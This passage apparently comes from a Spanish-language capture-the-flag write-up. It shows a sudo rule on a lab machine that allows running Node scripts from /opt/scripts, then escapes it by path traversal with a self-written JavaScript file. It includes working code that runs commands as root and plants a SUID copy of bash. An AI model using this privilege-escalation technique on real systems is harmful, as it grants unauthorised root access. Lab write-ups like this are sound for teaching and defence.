## Shell as root
Si vemos los permisos SUDOERS de `elaine` podremos ver los siguientes:
```bash
elaine@jerry:~$ sudo -l
Matching Defaults entries for elaine on jerry:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User elaine may run the following commands on jerry:
    (ALL) NOPASSWD: /usr/bin/node /opt/scripts/*.js
```

En esto hay una técnica y es que podemos hacer un path traversal para retroceder directorios y apuntar a un script `.js` donde podamos escribir. Vamos a crear uno para ejecutar `id`:
```js
var exec = require('child_process').exec;

exec('id',
    function (error, stdout, stderr) {
        console.log('stdout: ' + stdout);
        console.log('stderr: ' + stderr);
        if (error !== null) {
             console.log('exec error: ' + error);
        }
    });
```

Vamos a probarlo:
```bash
elaine@jerry:~$ sudo -u root /usr/bin/node /opt/scripts/../../home/elaine/pwned.js
stdout: uid=0(root) gid=0(root) groups=0(root)

stderr:
```

Ahora vamos a darnos una bash con SUID como root:
```js
var exec = require('child_process').exec;

exec('sudo cp /bin/bash /home/elaine/rootbash | sudo chmod u+s rootbash',
    function (error, stdout, stderr) {
        console.log('stdout: ' + stdout);
        console.log('stderr: ' + stderr);
        if (error !== null) {
             console.log('exec error: ' + error);
        }
    });
```
